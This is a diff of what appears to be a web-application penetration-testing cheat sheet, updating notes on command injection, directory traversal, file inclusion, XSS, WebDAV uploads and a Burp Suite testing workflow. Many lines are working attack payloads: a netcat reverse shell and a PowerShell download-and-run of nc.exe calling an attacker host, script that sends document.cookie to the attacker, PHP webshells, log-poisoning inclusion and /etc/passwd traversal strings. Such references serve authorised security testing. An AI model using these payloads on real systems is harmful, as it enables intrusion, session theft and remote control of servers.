@@ -15,16 +15,16 @@ TRACE       Used for debugging
 
 # HTTP Response Codes
 
-100         Continue
-200         OK
-301         Moved Permanently
-302         Found
-304         Not Modified
-400         Bad Request
-401         Unauthorized
-403         Forbidden
-404         Not Found
-500         Internal Server Error
+100  Continue
+200  OK
+301  Moved Permanently
+302  Found
+304  Not Modified
+400  Bad Request
+401  Unauthorized
+403  Forbidden
+404  Not Found
+500  Internal Server Error
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Browser Redirection
@@ -36,7 +36,7 @@ hacker:  use Metasploit browser autopwn
 # Cisco Router
 
 x is between 15 and 99.
-https://target IP/level/x/exec/-/show
+https://target.com/level/x/exec/-/show
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # ColdFusion
@@ -49,10 +49,17 @@ https://target IP/level/x/exec/-/show
 
 # Command Injection
 
-http://target IP/test.php?cmd=whoami
-http://target IP/test.php?cmd=nc -e /bin/sh <attacker IP> 443
+http://target.com/test.php?cmd=whoami
+http://target.com/test.php?cmd=nc -e /bin/sh <attacker IP> 443
 
-- PHP command injection from a GET request
+- Chain together commands
+;ls -la
+&&ls -la
+
+- Using commands with arguments when spaces are filtered
+&&{ls,-la}
+
+- PHP command injection using a GET request
 <?php echo system($_GET["cmd"]);?>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -68,6 +75,30 @@ Secure - only send over an encrypted channel
 
 <script>new Image().src="http://<attacker IP>/test.php?"+ document.cookie;</script>
 hacker: nc -lvp 80
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Directory Traversal
+
+http://target.com/loadImage?filename=1
+
+Use Burp Proxy > Forward
+Step through the loading process.
+When you see how the image/page is being loaded, right click in the body > Send to Repeater
+Repeater > Request
+Modify the file path > Send
+
+- Linux
+     filename=/etc/passwd                             Absolute path
+     filename=../../../etc/passwd                     Traversal
+     filename=....//....//....//etc/passwd            Nested traversal
+     filename=..%252f..%252f..%252fetc/passwd         Superfluous URL decode
+     filename=/var/www/images/../../../etc/passwd     Validation of start of path
+     filename=../../../etc/passwd%00.png              Validation of end of path
+
+- Windows
+     filename=\windows\win.ini                        Absolute path
+     filename=..\..\..\windows\win.ini                Traversal
+     filename=....\/....\/....\/etc/passwd            Nested traversal
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # DOM
@@ -89,11 +120,11 @@ $decode=base64_decode($cmd);
 os.system($decode);
 ?>
 
-curl -ikL -T shell.php http://<target IP>/shell.php
+curl -ikL -T shell.php http://target.com/shell.php
 Once the file has been uploaded, pass base64 encoded commands to it to get basic code execution
 
 - Method 2
-curl -ikL -X PUT -d '<?php system($_GET["c"]);?>' http://<target IP>/shell.php
+curl -ikL -X PUT -d '<?php system($_GET["c"]);?>' http://target.com/shell.php
 
 wget -O output -o /dev/null www.target.com/evil.php?cmd=$(echo id|base64)
 wget -O output -o /dev/null www.target.com/evil.php?cmd=$(echo ifconfig|base64)
@@ -107,22 +138,22 @@ When you are inside of a POST parameter, always use URL encoding.
 
 # Headers, Apache version, eTag, HTTP Basic Authentication Enabled
 
-nc <target IP> 80
+nc target.com 80
 HEAD / HTTP/1.0
 (hit enter 2x)
 
-curl -ikL -X HEAD <target IP>
+curl -ikL -X HEAD target.com
 
 for i in `cat 80.txt` ; do curl -ikL -X HEAD http://$i/ > $i 2>&1 ; echo Scanned $i ; done
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # HTTP methods allowed
 
-nc <target IP> 80
+nc target.com 80
 OPTIONS / HTTP/1.0
 (hit enter 2x)
 
-curl -ikL -X OPTIONS <target IP>
+curl -ikL -X OPTIONS target.com
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # iframe
@@ -132,23 +163,23 @@ curl -ikL -X OPTIONS <target IP>
 
 # Local File Inclusion
 
-http://<target IP>/test.php?page=/etc/passwd
+http://target.com/test.php?page=/etc/passwd
 
 - method 2
-nc <target IP> 80
+nc target.com 80
 GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
-Host: <target IP>
+Host: target.com
 Connection: close
 
-Send as cmd payload via http://<target IP>/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
+Send as cmd payload via http://target.com/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # PHP version
 
-nc <target IP> 80
+nc target.com 80
 GET / HEAD/1.0
 
-http://<target IP>/aaaaa.php
+http://target.com/aaaaa.php
 
 Firefox > Web Developer Toolbar > Information > View Response Headers
 ------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -160,7 +191,7 @@ Firefox > Web Developer Toolbar > Information > View Response Headers
 
 # Remote File Inclusion
 
-http://<target IP>/test.php?page=http://<attacker IP>/evil.txt
+http://target.com/test.php?page=http://<attacker IP>/evil.txt
 
 - method 2
 <?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://<attacker IP>/netcat/nc.exe','nc.exe'); cmd /c nc.exe <attacker IP> 443 -e cmd.exe\" }"); ?>
@@ -168,18 +199,22 @@ http://<target IP>/test.php?page=http://<attacker IP>/evil.txt
 
 # URL Encoding
 
+Reserved characters     @ $ & + = ; : , / ?
+Unsafe characters       space " < > # % { } | \ ^ ~ [ ] `
+
 %20       space
-%40   @   at
-%26   &   ampersand
-%28   (   open parenthesis
-%29   )   close parenthesis
-%3B   ;   semicolon
-%22   "   double quote
-%27   '   single quote
-%3C   <   less than
-%3E   >   greater than
 %2E   .   period
 %2F   /   forward slash
+%23   #
+%3F   ?
+%26   &   ampersand
+%25   %
+%2B   +
+%40   @   at
+%27   '   single quote
+%22   "   double quote
+%3C   <   less than
+%3E   >   greater than
 
 Example: <script>alert(document.cookie);</script>
 Encoded: %3Cscript%3Ealert%28document%2Ecookie%29%3B%3C%2Fscript%3E
@@ -190,7 +225,7 @@ Encoded: %3Cscript%3Ealert%28document%2Ecookie%29%3B%3C%2Fscript%3E
 msfconsole
 use auxiliary/scanner/http/webdav_scanner
 
-./davtest.pl -url http://target-IP
+./davtest.pl -url http://target.com
 
 for i in $(cat 80.txt); do cadaver -t $i; done
 ------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -226,7 +261,7 @@ Stored - example: guestbook
 <script>alert(document.cookie)</script>
 <iframe SRC="http://<attacker IP>" height="0" width="0"></iframe>
 <img src="http://<attacker IP>/doom.png" onload="javascript:alert('red team')"/>
-<script>new Image().src="http://attakerIP/test.php?output="+document.cookie;</script>
+<script>new Image().src="http://<attaker IP>/test.php?output="+document.cookie;</script>
 
 curl http://target.com/login.php?user=`perl –e 'print "a" x 500'`
 
@@ -279,27 +314,17 @@ If the webiste used PHP, use -x php
 
 # Setup Burp Suite Pro
 
-Open Burp
-New project on disk > Choose file > burp-project > Save
-Name: Base
-Next
-Use Burp defaults > Start Burp
-
-Open Burp > New project on disk > Name: burp-base
-Choose file > burp-base.burp > Save > Next > Sub Burp default > Start Burp
 Target > Site map:
     Right click on any pane > View > Tabs
-    Filter > click on the gear > Restore defaults > click out of the Filter
+    Filter > click on the gear > Restore defaults
 
 Proxy > Options > Intercept Client Requests:
     Enable URL and click Up to move to the top
-    Select File extension > Edit: add jpeg
-    Copy the contents > OK
+    Select File extension > Edit > copy the Match condifion > OK
 
 Proxy > Options > Intercept Server Responses:
     Enable Intercept responses based on the following rules
-    Disable Content type header
-    Enable URL and use the Up botton to move to the top
+    Enable URL and click Up to move to the top
     Add: And, File extension, Does not match, Match condition: paste contents from above, OK
 
 Match & Replace
@@ -311,25 +336,17 @@ Intruder > Options > Request Engine
 
 Extender > BApp Store > Refresh list > install the following extensions:
     Active Scann++, Additional Scanner Checks, Backslash Powered Scanner, CO2, CSRF Scanner,
-    Error Message Checks, J2EEScan, Java Deserialization Scanner, JSON Beautifier, Paramalyzer,
-    Retire.js, Site Map Fetcher, Software Version Reporter, Software Vulnerability Scanner, Wsdler
+    Error Message Checks, J2EEScan, Java Deserialization Scanner, Paramalyzer, Retire.js,
+    Site Map Fetcher, Software Version Reporter, Software Vulnerability Scanner, Wsdler
     and XSS Validator
 
 Options > Python Environment > Select file > Browse to /Applications/jython-standalone-2.7.0.jar > Open
 
-Project options > Misc > Burp Collaborator Server: Don't use Burp Collaborator
-
 User options > Connections > Platform Authentication > enable Prompt for credentials on platform authentication failure
 
 User options > Display
-    User Interface > Font size: 14
-    HTTP Message Display > Font: Courier 14
-
-User options > Misc > Proxy Interception: Always disable
-
-Burp menu > User options > Save user options: burp-user
-
-This will provide you a starting point for all future scans.
+    User Interface > Font size: 16
+    HTTP Message Display > Font: Courier 18
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Testing from home? Tunnel all your traffic over SSH to Kali running in Amazon EC2.
@@ -350,30 +367,37 @@ SOCKS Proxy host: 127.0.0.1
 SOCKS Proxy port: 1080
 Check Do DNS lookups over SOCKS proxy
 
-Open Firefox to http://whatismyipaddress.com
+Open embedded browser to http://whatismyipaddress.com
 The IP address should be your Kali EC2.
 Target > Site map: this should now populate
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 - New scan
-Copy burp-base.burp to the Desktop.
-Rename the file (client.burp)
-Open Burp > Open existing project > Choose file > Desktop > client.burp > open > Next
-Load from configuration file > Choose file > find your user prefs > Open > Next
-Dashboard > Resume
+Start Burp > Open existing project: uncheck Pause Automated Tasks
+New project on disk
+Enter a name
+Tab > rename the file if needed > Next > Start Burp
 
 - Establish scope
-Open Firefox > surf to the target site
-Target  > the Site map should be populating
+Proxy > turn off the Interncept
+Open browser > browse to the target site
+Target > Site map: this should be populating
 Right click on the target URL > Add to scope
-Filter > enable Show only in-scope items > Filter
-Target > Scope > you will see the URL listed in the top window
+Proxy history logging: Yes
+Filter > enable Show only in-scope items
 
 - Browse the target
-Look for target.com/sitemap and target.com/robots.txt
-Browse every link on each page.
-If not present, click on every link on the homepage.
-Continue until you have thoroughly browsed the target.
+Look for /robots.txt and /sitemap
+If either page exists, hold down on the Command button (Apple) and click on every link.
+Follow every link on each page and submit every form.
+Continue until you have thoroughly mapped the target.
+
+- Unrequested items
+Target > Site map > right click on the URL > Expand branch
+Look for items are shown in gray.
+Sort the top right pane by Time requested.
+This will group together the unrequested items.
+Right click on each item > Copy URL > paste in your browser.
 
 - Brute force directories
 Target > Site map > right click on the second line '/' > Send to Intruder
@@ -394,7 +418,7 @@ Compare the pages in the Site map to the Payloads in the Intruder window.
 Select a Payload that is not listed in the Site map
 Right click > Request in browser > In current session
 Enable In future, just copy the URL and don't show this dialog > Copy
-Open a new tab in Firefox and paste.
+Open a new tab in Chromium and paste.
 Repeat as necessary.
 
 - Analyze anomolies
@@ -406,28 +430,33 @@ Right click > Delete selected items > Yes
 Review uncomman HTTP status codes (5xx) > Response > Render
 Sort by Length, review minimum and maximum values > Response > Render
 
+- Attack surface
+Target > Site map > right click on the target URL > Engagement tools > Target analyzer
+Show the dynamic URLs, static URLs and parameters
+
 - Review comments
 Target > Site map > right click on the target URL > Engagement tools > Find comments
 Sort by Item
-Select each line > Response > right arrow key > look for sensitive information.
+Select each line > Response > right arrow key
+Look for sensitive information.
 
 - Visit referenced URLs
 Target > Site map > right click on the target URL > Expand branch
 Scroll to the very bottom.
 Right click on any empty folders that are greyed out > Delete branch > Yes
-Right click on any pages that are grey or red > Copy URL > Firefox > Paste & Go
+Right click on any pages that are grey or red > Copy URL > Chromium > Paste & Go
 Skip pages that end with css, jpg, js, pdf or png.
 Make sure at least one page has been visited under each folder.
 Select multiple URLs by holding down shift > right click > Copy selected URLs
-Firefox > select the + on the far right to access 'Open Multiple URLs' > paste > Open URLs
-Burp > once the URLs become black > Firefox > close the open tabs.
+Chromium > select the + on the far right to access 'Open Multiple URLs' > paste > Open URLs
+Burp > once the URLs become black > Chromium > close the open tabs.
 
 - Scan the target
 Target > Site map > right click on the target URL > Actively scan this host
 
 - Capture a packet
 Burp > Proxy > enable intercept
-Firefox > try to login to a web page.
+Chromium > try to login to a web page.
 Burp > right click on capture > Send to Intruder
 Intruder > Position > Attack type
 
@@ -506,7 +535,7 @@ Proxy > HTTP history > Filter > Filter by search term
 
 Right click on the first request > Engagement tools > Generate CSRF PoC
 Test in browser > Copy
-Open a new tab in Firefox > paste
+Open a new tab in Chroomium > paste
 Look for evidence that it executed whatever that HTTP request was supposed to do.
 
 https://portswigger.net/support/using-burp-to-test-for-cross-site-request-forgery-csrf
